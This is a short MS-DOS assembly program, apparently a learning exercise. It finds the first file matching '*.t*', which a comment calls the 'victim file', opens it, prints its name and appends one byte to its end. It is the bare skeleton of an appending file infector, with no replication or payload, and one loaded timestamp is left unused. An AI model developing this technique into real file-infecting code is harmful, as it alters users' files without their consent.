.model tiny
.code
org 100h
start:

    ; setting dta on file
    mov ah, 1ah
    lea dx, file
    int 21h

    ; finding victim file
    lea dx, file_mask
    mov ah, 4eh
    int 21h

    ; opening file (file descriptor -> ax)
    lea dx, file.fname
    mov ax, 3D02h
    int 21h
    mov bx, ax ; file descriptor (ax) -> bx

    ; output found filename
    mov file.fname[10], 13
    mov file.fname[11], 10
    mov file.fname[12], '$'
    lea dx, file.fname
    mov ah, 09h
    int 21h
    mov file.fname[12], 0
    
    ; moving carret to the end
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    mov ax, file.ftime

    ; writing data
    lea dx, file_mask
    mov cx, 1
    mov ah, 40h
    int 21h
    
    ; closing file
    mov ah, 3eh
    int 21h

    mov ah, 4ch
    int 21h

data:

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    fattr db ?
    ftime dw ?
    fdate dw ?
    fsize dd ?
    fname db 13 dup(?)
    ends
    
    file DTAFileInfo <>
    file_mask db '*.t*'

end start